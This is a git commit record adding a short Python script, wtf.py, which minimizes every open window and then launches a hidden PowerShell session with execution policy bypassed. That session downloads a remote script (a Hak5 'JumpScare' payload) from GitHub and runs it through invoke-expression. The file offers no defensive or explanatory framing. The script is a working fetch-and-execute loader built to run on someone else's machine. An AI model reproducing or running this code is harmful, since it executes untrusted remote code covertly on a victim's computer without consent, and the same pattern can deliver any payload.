070fab1da0134cafba8d16b5c17838317f716c68
peatoo04x2 <162782494+peatoo04x2@users.noreply.github.com>
2024-03-09 13:41:03 +0700

    Update wtf.py

--- wtf.py
+++ wtf.py
@@ -1,1 +1,10 @@
+import pyautogui
+import time
+import os
 
+# Start by minimizing all their current windows
+pyautogui.hotkey('win', 'm')
+time.sleep(0.5)
+
+# Run PowerShell command
+os.system('powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/I-Am-Jakoby/hak5-submissions/main/OMG/Payloads/OMG-JumpScare/JumpScare.ps1?dl=1; invoke-expression $pl')
